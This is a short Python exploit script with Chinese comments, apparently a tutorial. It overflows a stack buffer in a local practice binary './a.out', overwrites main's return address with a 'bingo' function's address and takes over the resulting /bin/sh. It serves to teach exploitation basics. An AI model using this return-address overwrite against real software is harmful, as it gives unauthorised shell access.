#!/usr/bin/env python
# encoding:utf-8

from zio import *

Io = zio("./a.out") # 打开本地文件
payload = (0x7fffffffdd88 - 0x7fffffffdd50) * 'A' # 首先将 buffer 和 main 返回地址之间的所有数据都填充成垃圾数据 , 其实是为了能覆盖到 main 的返回地址
payload = payload + l64(0x4005ed) # 将 main 的返回地址覆盖为 bingo 的地址
# 这里的 l64 函数可以将一个 16 进制数转换为 64 位机的内存地址
# 我们知道 64 位机的机器字长为 8 字节 , 因此就需要用 8 个字符来填充
# 16 位机的寄存器是 16 位数的 , 两个字节 , 64 位机相应就是 8 字节
# 其实 l64(0x4005ed) 函数就返回了这个字符串 : 
# "\xed\x05\x40\x00\x00\x00\x00\x00"
# 也可以直接手动写成上述字符串
# 现在开始写入数据
Io.write(payload)
# 写入之后应该执行 bingo 函数 也就是启动 /bin/sh
# 这个时候 , 我们就需要接管程序的输入输出
# 调用　interact() 这个函数来释放脚本对程序的控制
Io.interact()
# 现在脚本就编写完成了 , 测试一下吧

